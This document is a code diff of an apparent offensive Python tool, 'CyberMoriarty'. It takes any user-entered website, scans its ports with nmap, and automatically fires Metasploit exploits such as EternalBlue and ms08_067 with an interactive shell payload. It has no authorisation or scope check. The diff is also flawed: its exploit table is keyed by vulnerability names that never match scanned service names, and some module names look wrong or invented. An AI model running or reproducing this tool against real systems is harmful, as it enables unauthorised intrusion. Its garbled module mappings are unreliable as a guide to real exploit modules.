@@ -1,9 +1,11 @@
 import socket
 import requests
 import nmap
-import pandas as pd
+import logging
 from sklearn.ensemble import RandomForestClassifier
-from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
+from pymetasploit3.msfrpc import MsfRpcClient
+import subprocess
+import time
 
 class ThreatIntelligence:
     def __init__(self):
@@ -20,12 +22,16 @@ class CyberMoriarty:
         self.attack_log = []
         self.target = None
         self.threat_intelligence = ThreatIntelligence()
+        self.msfrpc_client = None
+        self.start_metasploit_rpc()
+
+    def start_metasploit_rpc(self):
         try:
+            subprocess.Popen(['msfrpcd', '-P', 'CyberMoriarty', '-S'])
+            time.sleep(5)  # Wait for msfrpcd to start
             self.msfrpc_client = MsfRpcClient('CyberMoriarty', ssl=False)
-            print("Connected to Metasploit RPC server.")
-        except MsfRpcError as e:
-            print(f"Failed to connect to Metasploit RPC server: {e}")
-            self.msfrpc_client = None
+        except Exception as e:
+            logging.error(f"Failed to start msfrpcd: {e}")
 
     def resolve_ip(self, website):
         try:
@@ -40,61 +46,47 @@ class CyberMoriarty:
             print("Target not set.")
             return
         scanner = nmap.PortScanner()
-        print(f"Scanning target {self.target}...")
-        try:
-            scanner.scan(self.target, arguments="-p1-1024 -T4")
-            for host in scanner.all_hosts():
-                for proto in scanner[host].all_protocols():
-                    lport = scanner[host][proto].keys()
-                    for port in lport:
-                        print(f"Found {scanner[host][proto][port]['name']} on port {port}")
-                        self.vulnerabilities.append({
-                            'host': host,
-                            'port': port,
-                            'name': scanner[host][proto][port]['name'],
-                            'product': scanner[host][proto][port]['product']
-                        })
-        except Exception as e:
-            print(f"Error scanning target: {e}")
+        scanner.scan(self.target, arguments="-p1-1024 -T4")
+        for host in scanner.all_hosts():
+            for proto in scanner[host].all_protocols():
+                lport = scanner[host][proto].keys()
+                for port in lport:
+                    self.vulnerabilities.append({
+                        'host': host,
+                        'port': port,
+                        'name': scanner[host][proto][port]['name'],
+                        'product': scanner[host][proto][port]['product']
+                    })
 
     def suggest_exploits(self):
         common_exploits = {
-            'http': 'exploit/unix/webapp/phpmyadmin_pma_password',
-            'ssl': 'exploit/multi/http/ssl_slammer',
-            'ssh': 'exploit/multi/ssh/sshexec',
-            'ftp': 'exploit/unix/ftp/proftpd_modcopy_exec',
-            'smtp': 'exploit/unix/smtp/exim4_string_format',
-            'smb': 'exploit/windows/smb/ms17_010_eternalblue',
-            'rce': 'exploit/windows/smb/ms08_067_netapi',
-            'mysql': 'exploit/multi/mysql/mysql_yassl_getname',
-            'postgresql': 'exploit/multi/postgres/postgres_payload',
-            'vnc': 'exploit/multi/vnc/vnc_keyboard_auth_bypass'
+            'SQL Injection': 'exploit/unix/webapp/phpmyadmin_pma_password',
+            'Cross-Site Scripting (XSS)': 'exploit/multi/browser/firefox_xpi_bootstrapped_addon',
+            'Remote Code Execution (RCE)': 'exploit/windows/smb/ms17_010_eternalblue',
+            'Buffer Overflow': 'exploit/windows/smb/ms08_067_netapi',
+            'File Inclusion': 'exploit/unix/webapp/php_include',
+            'Command Injection': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
+            'Directory Traversal': 'exploit/multi/http/dir_scanner',
+            'Cross-Site Request Forgery (CSRF)': 'auxiliary/gather/phishery',
+            'Authentication Bypass': 'exploit/windows/http/struts2_namespace_ognl',
+            'Weak Passwords': 'auxiliary/scanner/ssh/ssh_login'
         }
 
         if self.vulnerabilities:
-            print("Suggesting exploits based on vulnerabilities...")
             for vulnerability in self.vulnerabilities:
                 service = vulnerability['name']
                 if service in common_exploits:
-                    print(f"Suggesting exploit for {service} on port {vulnerability['port']}")
                     self.exploit_suggestions.append({
                         'port': vulnerability['port'],
                         'service': service,
                         'version': vulnerability['product'],
                         'exploit': common_exploits[service]
                     })
-                else:
-                    print(f"No exploit suggestion for {service} on port {vulnerability['port']}")
 
     def execute_attack(self):
-        if not self.msfrpc_client:
-            print("Metasploit RPC client not connected.")
-            return
-
         for suggestion in self.exploit_suggestions:
-            if suggestion['exploit']:
-                try:
-                    print(f"Executing exploit {suggestion['exploit']} on port {suggestion['port']}")
+            try:
+                if suggestion['exploit']:
                     exploit = self.msfrpc_client.modules.use('exploit', suggestion['exploit'])
                     exploit['RHOSTS'] = self.target
                     exploit['RPORT'] = suggestion['port']
@@ -102,34 +94,26 @@ class CyberMoriarty:
                     exploit['PASSWORD'] = 'password'  # Replace with valid password
                     payload = self.msfrpc_client.modules.use('payload', 'cmd/unix/interact')
                     result = exploit.execute(payload=payload)
-
-                    # Checking if the result is a boolean and logging accordingly
-                    if isinstance(result, bool):
-                        if result:
-                            status = 'Attack executed'
-                        else:
-                            status = 'Attack failed'
-                    else:
-                        status = 'Unknown response'
-
+                    status = 'Attack executed' if result['job_id'] else 'Attack failed'
+                    
                     self.attack_log.append({
                         'port': suggestion['port'],
                         'service': suggestion['service'],
                         'status': status
                     })
-                    print(f"{status} on {suggestion['service']}:{suggestion['port']}")
-                except Exception as e:
-                    print(f"Error executing exploit {suggestion['exploit']}: {str(e)}")
+                    print(f"Attack {status} on {suggestion['service']}:{suggestion['port']}")
+                else:
                     self.attack_log.append({
                         'port': suggestion['port'],
                         'service': suggestion['service'],
-                        'status': f'Error: {str(e)}'
+                        'status': 'No known exploit'
                     })
-            else:
+            except Exception as e:
+                logging.error(f"Failed to execute attack on {suggestion['service']}:{suggestion['port']}: {e}")
                 self.attack_log.append({
                     'port': suggestion['port'],
                     'service': suggestion['service'],
-                    'status': 'No known exploit'
+                    'status': f'Attack failed: {e}'
                 })
 
     def generate_report(self):
@@ -153,9 +137,10 @@ if __name__ == "__main__":
     tool = CyberMoriarty()
     target_website = input("Enter the target website: ")
     tool.resolve_ip(target_website)
-    tool.scan_target()
-    tool.suggest_exploits()
-    tool.execute_attack()
-    tool.generate_report()
+    if tool.target:
+        tool.scan_target()
+        tool.suggest_exploits()
+        tool.execute_attack()
+        tool.generate_report()
 
 
